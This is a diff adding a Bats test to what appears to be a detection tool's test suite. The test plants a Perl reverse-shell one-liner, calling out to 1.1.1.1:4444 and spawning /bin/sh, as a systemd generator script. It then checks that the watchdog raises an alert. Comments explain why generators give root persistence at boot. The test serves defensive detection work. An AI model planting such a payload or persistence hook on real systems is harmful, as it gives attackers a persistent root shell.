@@ -286,3 +286,19 @@ seed_benign() {
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on systemd generator surface)" {
+    # Sister to nc / python -c / curl|bash / dev-tcp systemd-
+    # generator rev-shell variants. Perl on every Debian/Ubuntu.
+    # Locks perl axis on T1037 systemd-generator-trigger root-
+    # exec persistence — generators run AS ROOT in initramfs /
+    # very early boot; planted perl rev-shell fires on every
+    # boot until detected.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${GEND}/my-generator"
+    chmod 0755 "${GEND}/my-generator"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
